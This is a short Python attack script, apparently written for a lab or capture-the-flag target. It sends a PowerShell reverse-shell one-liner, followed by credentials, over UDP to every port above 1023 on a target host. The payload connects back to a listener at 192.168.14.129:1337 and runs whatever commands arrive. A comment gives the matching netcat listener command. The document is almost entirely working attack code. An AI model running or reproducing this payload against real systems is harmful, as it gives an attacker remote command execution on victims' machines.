#!/usr/bin/python3
# stty raw -echo; (stty size; cat) | nc -lvnp 1337

import socket

payload = """WindowsPowerShell\\v1.0\powershell.exe
-nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.14.129',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
Admin
12345"""

byte_message = bytes(payload, "utf-8")

for i in range(1024,65500):
    opened_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    opened_socket.sendto(byte_message, ("192.168.14.137", i))
    print(f"Trying port {i}",end="\r")
